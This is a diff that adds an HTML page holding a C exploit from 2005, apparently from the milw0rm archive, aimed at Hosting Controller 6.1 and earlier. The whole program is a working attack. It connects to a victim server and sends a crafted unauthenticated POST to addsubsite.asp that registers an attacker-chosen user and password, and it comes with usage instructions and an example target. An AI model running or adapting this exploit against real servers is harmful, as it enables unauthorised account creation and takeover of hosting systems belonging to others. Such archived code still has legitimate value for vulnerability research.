@@ -1,0 +1,217 @@
+<html>
+<head>
+<title>Hosting Controller <= 0.6.1 Unauthenticated User Registeration (2nd)</title>
+<pre>
+/*****************************************************
+*                                                    *
+*  [Hosting Controller &lt;= v6.1] exploit              *
+*                                                    *
+*  sileHOSTCxpl                                      *
+*                                                    *
+*  This exploit utilize two ways for exploiting      *
+*  vulnerability present into Hosting Controller.    *
+*  This exploit create new user with relative        *
+*  passwd and registered your host with mail server  *
+*  into Hosting Controller software ;\               *
+*                                                    *
+*  References: www.milw0rm.com/id.php?id=979         * 
+*                                                    *
+*  coded by: Silentium of Anacron Group Italy        *
+*      date: 05/05/2005                              *
+*    e-mail: anacrongroupitaly[at]autistici[dot]org  *
+*   my_home: www.autistici.org/anacron.group-italy   *
+*                                                    *
+*  this tool is developed under GPL license          *
+*  no(c) .:. copyleft                                *
+*                                                    *
+*****************************************************/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;netinet/in.h&gt;
+#include &lt;netdb.h&gt;
+
+#define PORT1 80		// port of web server 
+#define PORT2 8077		// port of hosting controller
+
+void info(void);
+void banner(void);
+void sendxpl(FILE *out, char *argv[], int type);
+void errsock(void);
+void errgeth(void);
+void errconn(char *argv[]);
+
+
+int main(int argc, char *argv[]){
+
+FILE *out;
+int sock, sockconn, type;
+struct sockaddr_in addr;
+struct hostent *hp;
+
+type = atoi(argv[6]);
+
+if(argc!=7 || (type &lt; 1) || (type &gt; 2))
+   info();
+
+banner();
+   
+if((sock = socket(AF_INET,SOCK_STREAM,0)) &lt; 0)
+   errsock();
+   
+   printf(&quot;[*] Creating socket		[OK]\n&quot;);
+
+if((hp = gethostbyname(argv[1])) == NULL)
+   errgeth();
+   
+   printf(&quot;[*] Resolving victim host	[OK]\n&quot;);
+   
+memset(&amp;addr,0,sizeof(addr));
+memcpy((char *)&amp;addr.sin_addr,hp-&gt;h_addr,hp-&gt;h_length);
+addr.sin_family = AF_INET;
+
+if(type == 1)
+   addr.sin_port = htons(PORT1);
+else
+   addr.sin_port = htons(PORT2);
+   
+sockconn = connect(sock,(struct sockaddr *)&amp;addr,sizeof(addr));
+if(sockconn &lt; 0)
+   errconn(argv);
+   
+   printf(&quot;[*] Connecting at victim host   [OK]\n&quot;);
+   
+out = fdopen(sock,&quot;a&quot;);
+setbuf(out,NULL);
+
+sendxpl(out,argv,type);
+
+if(type == 1)
+   printf(&quot;[*] Now test your username and password\n&quot; 
+          &quot;    on http://%s/admin/\n\n&quot;,argv[1]);
+else
+   printf(&quot;[*] Now test your username and password\n&quot;
+          &quot;    on http://%s:8077\n\n&quot;,argv[1]);
+
+shutdown(sock,2);
+close(sock);
+
+return 0;
+
+}
+
+
+void info(void){
+
+system(&quot;clear&quot;);
+printf(&quot;\n\t         #########################################\n&quot;
+       &quot;\t         #             sileHOSTCxpl              #\n&quot;
+       &quot;\t         #  ###################################  #\n&quot;
+       &quot;\t         #          Hosting Controller           #\n&quot;
+       &quot;\t         #           &lt;= v6.1 exploit             #\n&quot;
+       &quot;\t         #   Unauthenticated User Registration   #\n&quot;
+       &quot;\t         #          coded by Silentium           #\n&quot;            
+       &quot;\t         #        [ Anacron Group Italy ]        #\n&quot;
+       &quot;\t         #  ###################################  #\n&quot;
+       &quot;\t         # www.autistici.org/anacron-group-italy #\n&quot;
+       &quot;\t         #########################################\n\n&quot;
+       &quot; [Usage]\n\n&quot; 
+       &quot;  sileHOSTCxpl &lt;victim&gt; &lt;username&gt; &lt;password&gt; &lt;your_host&gt; &lt;mailserver&gt; &lt;type&gt;\n\n&quot;
+       &quot;        [Type]\n\n&quot;
+       &quot;              1) web server daemon	   [port 80]\n&quot;
+       &quot;              2) hosting controller daemon [port 8077]\n\n&quot;
+       &quot; [Example]\n\n&quot;
+       &quot;  sileHOSTCxpl www.victim.com sile silePass anacrongroup.org imail 1\n\n&quot;); 
+exit(1);
+
+}
+
+
+void banner(void){
+
+system(&quot;clear&quot;);
+printf(&quot;[-] sileHOSTCxpl\n&quot;
+       &quot;    ============\n&quot;
+       &quot;[-] Hosting Controller &lt;= v6.1 exploit\n&quot;
+       &quot;[-] coded by Silentium - Anacron Group Italy\n&quot;
+       &quot;[-] www.autistici.org/anacron-group-italy\n\n&quot;);
+       
+}
+       
+
+void sendxpl(FILE *out, char *argv[], int type){
+
+int size = 132;
+
+size+=strlen(argv[2]);
+size+=strlen(argv[3]);
+size+=strlen(argv[4]);
+size+=strlen(argv[5]);
+    
+if(type == 1)    
+    fprintf(out,&quot;POST /admin/hosting/addsubsite.asp HTTP/1.0\n&quot;
+                &quot;Connection: Keep-Alive\n&quot;
+                &quot;Pragma: no-cache\n&quot;
+                &quot;Cache-control: no-cache\n&quot;
+                &quot;Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n&quot;
+                &quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n&quot;
+                &quot;Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n&quot;
+                &quot;Accept-Language: en\n&quot;
+                &quot;Host: %s\n&quot;
+                &quot;Content-Type: application/x-www-form-urlencoded\n&quot;
+                &quot;Content-Length: %d\n\n&quot;
+                &quot;reseller=resadmin&amp;domaintypecheck=SECOND&amp;DomainName=%s&amp;loginname=%s&amp;&quot;
+                &quot;Quota=-1&amp;htype=27&amp;choice=1&amp;mailaccess=TRUE&amp;MailServerType=%s&amp;password&quot;
+                &quot;=%s&quot;,argv[1],size,argv[4],argv[2],argv[5],argv[3]); 
+else
+    fprintf(out,&quot;POST /hosting/addsubsite.asp HTTP/1.0\n&quot;
+                &quot;Connection: Keep-Alive\n&quot;
+                &quot;Pragma: no-cache\n&quot;
+                &quot;Cache-control: no-cache\n&quot;
+                &quot;Accept: text/html, image/jpeg, image/png, text/*, image/*, */*\n&quot;
+                &quot;Accept-Encoding: x-gzip, x-deflate, gzip, deflate, identity\n&quot;
+                &quot;Accept-Charset: iso-8859-1, utf-8;q=0.5, *;q=0.5\n&quot;
+                &quot;Accept-Language: en\n&quot;
+                &quot;Host: %s\n&quot;
+                &quot;Content-Type: application/x-www-form-urlencoded\n&quot;
+                &quot;Content-Length: %d\n\n&quot;
+                &quot;reseller=resadmin&amp;domaintypecheck=SECOND&amp;DomainName=%s&amp;loginname=%s&amp;&quot;
+                &quot;Quota=-1&amp;htype=27&amp;choice=1&amp;mailaccess=TRUE&amp;MailServerType=%s&amp;password&quot;
+                &quot;=%s&quot;,argv[1],size,argv[4],argv[2],argv[5],argv[3]);
+                                                                                                                                                                                                                                     
+                                  
+                 printf(&quot;[*] Sending exploit		[OK]\n\n&quot;);
+
+}
+            
+                 
+void errsock(void){
+
+system(&quot;clear&quot;);
+printf(&quot;[x] Creating socket	[FAILED]\n\n&quot;);
+exit(1);
+
+}
+
+
+void errgeth(void){
+
+printf(&quot;[x] Resolving victim host	[FAILED]\n\n&quot;);
+exit(1);
+
+}
+
+
+void errconn(char *argv[]){
+
+printf(&quot;[x] Connecting at victim host	[FAILED]\n\n&quot;,argv[1]);
+exit(1);
+
+}
+
+// milw0rm.com [2005-05-07]
+</pre>
+</html>
+
